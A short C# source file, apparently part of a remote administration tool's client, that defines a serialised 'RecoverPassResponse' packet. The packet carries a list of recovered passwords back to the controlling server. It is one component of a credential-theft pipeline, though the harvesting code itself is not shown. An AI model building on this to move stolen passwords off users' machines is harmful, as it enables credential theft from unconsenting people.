using ProtoBuf;
using System.Collections.Generic;
using xClient.Core.Recovery.Helper;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class RecoverPassResponse : IPacket
    {
        [ProtoMember(1)]
        public List<string> Passwords { get; set; }

        public RecoverPassResponse()
        {
        }

        public RecoverPassResponse(List<string> data)
        {
            this.Passwords = data;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}